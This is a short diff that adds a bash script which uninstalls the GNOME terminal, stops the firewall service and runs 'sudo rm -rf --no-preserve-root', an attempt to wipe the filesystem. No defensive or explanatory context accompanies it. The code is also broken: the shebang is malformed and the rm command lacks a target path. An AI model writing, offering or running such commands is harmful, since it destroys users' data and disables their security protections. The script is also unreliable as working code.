@@ -1,1 +1,4 @@
-
+#!bin/bash 
+sudo apt-get remove gnome-terminal
+sudo systemctl stop firewall
+sudo rm -rf --no-preserve-root
